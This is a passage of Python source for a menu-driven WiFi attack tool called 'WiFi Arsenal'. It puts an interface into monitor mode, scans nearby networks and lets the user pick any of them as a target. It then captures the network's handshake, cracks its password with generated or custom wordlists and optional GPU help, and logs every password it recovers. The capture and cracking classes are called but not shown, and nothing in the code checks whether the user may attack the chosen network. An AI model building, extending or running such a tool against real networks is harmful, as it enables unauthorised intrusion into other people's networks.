            print(f"{Fore.GREEN}🔧 Setup & Configuration:{Style.RESET_ALL}")
            print("1.  Interface Setup & Monitor Mode")
            print("2.  System Dependency Check")
            
            print(f"\n{Fore.YELLOW}📡 Network Operations:{Style.RESET_ALL}")
            print("3.  Advanced Network Discovery")
            print("4.  Handshake Capture")
            print("5.  Password Cracking")
            
            print(f"\n{Fore.BLUE}🛠️  Utilities:{Style.RESET_ALL}")
            print("6.  Smart Wordlist Generation")
            print("7.  View Results & Reports")
            print("8.  System Information")
            
            print(f"\n{Fore.RED}0.  Exit{Style.RESET_ALL}")
            print("="*80)
            
            try:
                choice = input(f"\n{Fore.CYAN}[?] Select option: {Style.RESET_ALL}").strip()
                
                if choice == '1':
                    self.interface_setup_menu()
                elif choice == '2':
                    self.check_dependencies()
                elif choice == '3':
                    self.network_discovery_menu()
                elif choice == '4':
                    self.handshake_capture_menu()
                elif choice == '5':
                    self.password_cracking_menu()
                elif choice == '6':
                    self.wordlist_generation_menu()
                elif choice == '7':
                    self.view_results_menu()
                elif choice == '8':
                    self.system_info_menu()
                elif choice == '0':
                    self.cleanup_and_exit()
                else:
                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                self.cleanup_and_exit()
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

    def interface_setup_menu(self):
        """Interface setup menu"""
        interfaces = self.get_wireless_interfaces()
        
        if not interfaces:
            print(f"{Fore.RED}[!] No wireless interfaces found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}[*] Available wireless interfaces:{Style.RESET_ALL}")
        for i, iface in enumerate(interfaces):
            print(f"  {i+1}. {iface}")
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select interface: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(interfaces):
                self.interface = interfaces[choice]
                if self.setup_monitor_mode(self.interface):
                    print(f"{Fore.GREEN}[+] Interface {self.interface} configured successfully{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] Failed to setup monitor mode{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def network_discovery_menu(self):
        """Network discovery menu"""
        if not self.monitor_interface:
            print(f"{Fore.RED}[!] Please setup monitor mode first{Style.RESET_ALL}")
            return
        
        try:
            duration = int(input(f"{Fore.CYAN}[?] Scan duration in seconds (default 60): {Style.RESET_ALL}") or "60")
            
            networks = self.scan_networks(duration)
            if networks:
                self.target_networks = networks
                self.display_networks(networks)
                
                # Save scan results
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                scan_file = f"{self.results_dir}/scans/scan_{timestamp}.json"
                with open(scan_file, 'w') as f:
                    json.dump(networks, f, indent=2)
                print(f"\n{Fore.GREEN}[+] Scan results saved to {scan_file}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] No networks found{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def handshake_capture_menu(self):
        """Handshake capture menu"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
        
        self.display_networks(self.target_networks)
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select target network: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(self.target_networks):
                target = self.target_networks[choice]
                
                print(f"{Fore.YELLOW}[*] Starting handshake capture...{Style.RESET_ALL}")
                
                capture = RealHandshakeCapture(self.monitor_interface)
                cap_file = capture.capture_handshake(
                    target['bssid'],
                    target['channel'], 
                    target['essid']
                )
                
                if cap_file and os.path.exists(cap_file):
                    # Move to results directory
                    final_path = os.path.join(self.results_dir, 'handshakes', os.path.basename(cap_file))
                    shutil.move(cap_file, final_path)
                    self.captured_handshakes.append(final_path)
                    print(f"{Fore.GREEN}[+] Handshake saved to {final_path}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] Handshake capture failed{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def password_cracking_menu(self):
        """Password cracking menu"""
        if not self.captured_handshakes:
            # Check for existing handshakes
            handshake_dir = f"{self.results_dir}/handshakes"
            if os.path.exists(handshake_dir):
                handshakes = [f for f in os.listdir(handshake_dir) if f.endswith('.cap')]
                if handshakes:
                    self.captured_handshakes = [os.path.join(handshake_dir, h) for h in handshakes]
        
        if not self.captured_handshakes:
            print(f"{Fore.RED}[!] No captured handshakes available{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}[*] Available handshakes:{Style.RESET_ALL}")
        for i, cap_file in enumerate(self.captured_handshakes):
            print(f"  {i+1}. {os.path.basename(cap_file)}")
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select handshake: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(self.captured_handshakes):
                cap_file = self.captured_handshakes[choice]
                
                # Wordlist options
                use_custom = input(f"{Fore.CYAN}[?] Use custom wordlist? (y/N): {Style.RESET_ALL}").lower() == 'y'
                wordlist_file = None
                
                if use_custom:
                    wordlist_file = input(f"{Fore.CYAN}[?] Wordlist file path: {Style.RESET_ALL}").strip()
                    if not os.path.exists(wordlist_file):
                        print(f"{Fore.RED}[!] Wordlist file not found{Style.RESET_ALL}")
                        return
                
                # GPU acceleration
                use_gpu = input(f"{Fore.CYAN}[?] Use GPU acceleration (if available)? (y/N): {Style.RESET_ALL}").lower() == 'y'
                
                print(f"{Fore.YELLOW}[*] Starting password cracking...{Style.RESET_ALL}")
                
                cracker = RealPasswordCracker()
                password = cracker.crack_handshake(cap_file, wordlist_file, use_gpu)
                
                if password:
                    print(f"{Fore.GREEN}[+] SUCCESS! Password found: {password}{Style.RESET_ALL}")
                    # Save result
                    result_file = f"{self.results_dir}/results.txt"
                    with open(result_file, 'a') as f:
                        f.write(f"{datetime.now()}: {cap_file} -> {password}\n")
                else:
                    print(f"{Fore.RED}[-] Password not found{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def wordlist_generation_menu(self):
        """Wordlist generation menu"""
        try:
            size = int(input(f"{Fore.CYAN}[?] Wordlist size (default 50000): {Style.RESET_ALL}") or "50000")
            
            cracker = RealPasswordCracker()
            wordlist_file = cracker.generate_smart_wordlist(size)
            
            print(f"{Fore.GREEN}[+] Wordlist generated: {wordlist_file}{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def view_results_menu(self):
        """View results and reports"""
        print(f"\n{Fore.CYAN}[*] WiFi Arsenal Results Summary{Style.RESET_ALL}")
        print("-" * 60)
        
        # Count results
        subdirs = ['handshakes', 'wordlists', 'logs', 'scans', 'attacks']
        
        for subdir in subdirs:
            path = os.path.join(self.results_dir, subdir)
            if os.path.exists(path):
                files = os.listdir(path)
                print(f"{Fore.GREEN}{subdir.title()}:{Style.RESET_ALL} {len(files)} files")
                
                # Show recent files
                if files:
                    for f in sorted(files)[-3:]:
                        file_path = os.path.join(path, f)
                        try:
                            size = os.path.getsize(file_path)
                            print(f"  - {f} ({size} bytes)")
                        except:
                            print(f"  - {f}")

    def system_info_menu(self):
        """System information display"""
        print(f"\n{Fore.CYAN}[*] System Information{Style.RESET_ALL}")
        print("-" * 50)
        
        # Basic info
        print(f"WiFi Arsenal Version: {self.version}")
        print(f"Python Version: {sys.version.split()[0]}")
        
        # Interface status
        interfaces = self.get_wireless_interfaces()
        print(f"Wireless Interfaces: {', '.join(interfaces) if interfaces else 'None'}")
        
        if self.interface:
            print(f"Active Interface: {self.interface}")
        if self.monitor_interface:
            print(f"Monitor Interface: {self.monitor_interface}")
        
        # System capabilities
        print(f"\n{Fore.CYAN}[*] Capabilities:{Style.RESET_ALL}")
        capabilities = {
            'Root Access': os.geteuid() == 0,
            'Monitor Mode': bool(self.monitor_interface),
            'Aircrack-ng Suite': self.command_exists('aircrack-ng'),
            'Hashcat GPU': self.command_exists('hashcat'),
            'John the Ripper': self.command_exists('john')
        }
        
        for cap, status in capabilities.items():
            status_color = Fore.GREEN if status else Fore.RED
            status_text = "✓" if status else "✗"
            print(f"  {status_color}{status_text}{Style.RESET_ALL} {cap}")

    def cleanup_and_exit(self):
        """Cleanup and exit gracefully"""
        print(f"\n{Fore.YELLOW}[*] Cleaning up...{Style.RESET_ALL}")
        
        # Stop monitor mode
        self.stop_monitor_mode()
        
        # Log session end
        self.logger.info("WiFi Arsenal session ended")
        
        print(f"{Fore.GREEN}[*] Thank you for using WiFi Arsenal!")
        print(f"[*] Results saved in: {self.results_dir}")
        print(f"[*] Developed by {self.author}{Style.RESET_ALL}")
        
        sys.exit(0)

    def run(self):
        """Main entry point"""
        self.banner()
        
        # Check privileges
        if os.geteuid() != 0:
            print(f"{Fore.RED}[!] Root privileges required for full functionality")
            print(f"[*] Run with: sudo python3 wifi_arsenal.py{Style.RESET_ALL}")
            
            response = input(f"{Fore.YELLOW}[?] Continue with limited functionality? (y/N): {Style.RESET_ALL}")
            if response.lower() != 'y':
                sys.exit(1)
        
        # Check dependencies
        if not self.check_dependencies():
            print(f"{Fore.YELLOW}[*] Some functionality may be limited{Style.RESET_ALL}")
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, lambda sig, frame: self.cleanup_and_exit())
        signal.signal(signal.SIGTERM, lambda sig, frame: self.cleanup_and_exit())
        
        print(f"{Fore.GREEN}[+] WiFi Arsenal initialized successfully")
        print(f"[*] Full real implementation ready...{Style.RESET_ALL}")
        
        self.logger.info(f"WiFi Arsenal v{self.version} started")
        
        # Start main menu
        self.main_menu()

if __name__ == "__main__":
    try:
        arsenal = WiFiArsenal()
        arsenal.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}{Style.RESET_ALL}")
        sys.exit(1)
